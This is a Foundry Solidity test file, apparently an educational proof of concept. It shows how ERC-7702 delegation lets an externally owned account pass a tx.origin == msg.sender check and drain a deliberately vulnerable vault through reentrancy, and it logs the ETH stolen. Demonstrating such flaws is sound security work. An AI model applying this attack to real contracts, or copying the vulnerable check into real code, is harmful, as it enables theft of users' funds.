// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {Test, Vm, console} from "forge-std/Test.sol";
import {VulnerableVault} from "../src/VulnerableVault.sol";
import {MaliciousDelegatee} from "../src/MaliciousDelegatee.sol";

/// @title ReentrancyAttackTest
/// @notice Demonstrates how ERC-7702 breaks the tx.origin == msg.sender security assumption
contract ReentrancyAttackTest is Test {
    VulnerableVault public vault;
    MaliciousDelegatee public maliciousDelegatee;

    Vm.Wallet _attacker;
    Vm.Wallet _victim;

    function setUp() public {
        // Create wallets
        _attacker = vm.createWallet("attacker");
        _victim = vm.createWallet("victim");

        vm.deal(_attacker.addr, 10 ether);
        vm.deal(_victim.addr, 10 ether);

        // Deploy contracts
        vault = new VulnerableVault();
        maliciousDelegatee = new MaliciousDelegatee();

        // Victim deposits funds into the vault
        vm.prank(_victim.addr);
        vault.deposit{value: 5 ether}();

        // Other users also have funds in the vault (to steal)
        vault.deposit{value: 10 ether}();
    }

    /// @notice Shows that pre-7702, the tx.origin check would have worked
    function test_PreERC7702_ContractCannotWithdraw() public {
        // Attacker deposits from their EOA
        vm.prank(_attacker.addr);
        vault.deposit{value: 1 ether}();

        // If attacker tries to withdraw through a contract, tx.origin != msg.sender
        // This would revert with "no contracts allowed!"
        // (We can't easily test this without 7702, but the logic is clear)

        // Direct EOA withdrawal works fine
        vm.prank(_attacker.addr, _attacker.addr);
        vault.withdraw();

        assertEq(vault.balances(_attacker.addr), 0);
    }

    /// @notice THE MAIN EVENT: ERC-7702 enables reentrancy despite tx.origin check!
    function test_ERC7702_ReentrancyAttack() public {
        // Step 1: Attacker deposits a small amount as "bait"
        vm.prank(_attacker.addr);
        vault.deposit{value: 1 ether}();

        console.log("=== Initial State ===");
        console.log("Vault balance:", vault.vaultBalance());
        console.log("Attacker balance in vault:", vault.balances(_attacker.addr));
        console.log("Attacker ETH balance:", _attacker.addr.balance);

        // Step 2: Attacker delegates their EOA to the malicious contract
        Vm.SignedDelegation memory signedDelegation =
            vm.signDelegation(address(maliciousDelegatee), _attacker.privateKey);
        vm.attachDelegation(signedDelegation);

        // Step 3: Verify the attacker's EOA now has code (the delegation pointer)
        uint256 codeSize = _attacker.addr.code.length;
        assertEq(codeSize, 23); // 20 bytes address + 3 magic bytes

        // Step 4: Setup the attack parameters (on the attacker's EOA storage)
        // We call the delegated EOA as if it were the MaliciousDelegatee contract
        MaliciousDelegatee(payable(_attacker.addr)).setupAttack(vault, 3);

        // Step 5: Execute the attack!
        console.log("\n=== Executing Attack ===");
        uint256 vaultBalanceBefore = vault.vaultBalance();

        vm.prank(_attacker.addr, _attacker.addr);
        MaliciousDelegatee(payable(_attacker.addr)).attack();

        console.log("\n=== Final State ===");
        console.log("Vault balance:", vault.vaultBalance());
        console.log("Attacker ETH balance:", _attacker.addr.balance);
        console.log("Attack count (reentrancy depth):", MaliciousDelegatee(payable(_attacker.addr)).attackCount());

        // The attacker should have drained more than their 1 ether deposit!
        // With 3 re-enters, they withdrew 4 ether total (1 + 1 + 1 + 1)
        // but only deposited 1 ether
        uint256 stolen = vaultBalanceBefore - vault.vaultBalance() - 1 ether;
        console.log("ETH stolen:", stolen);

        assertGt(_attacker.addr.balance, 10 ether, "Attacker should have profited");
    }

    /// @notice Demonstrates that tx.origin == msg.sender STILL HOLDS for delegated EOA
    function test_TxOriginEqualsMsgSender_StillTrue() public {
        // Delegate attacker's EOA
        Vm.SignedDelegation memory signedDelegation =
            vm.signDelegation(address(maliciousDelegatee), _attacker.privateKey);
        vm.attachDelegation(signedDelegation);

        // When calling through the delegated EOA:
        // - tx.origin = _attacker.addr (the transaction originator)
        // - msg.sender = _attacker.addr (the caller of the vault)
        // So tx.origin == msg.sender is TRUE, bypassing the "security" check!

        vm.prank(_attacker.addr, _attacker.addr);
        vault.deposit{value: 1 ether}();

        // This should NOT revert despite the EOA having code
        vm.prank(_attacker.addr, _attacker.addr);
        vault.withdraw();

        // The withdrawal succeeded!
        assertEq(vault.balances(_attacker.addr), 0);
    }
}
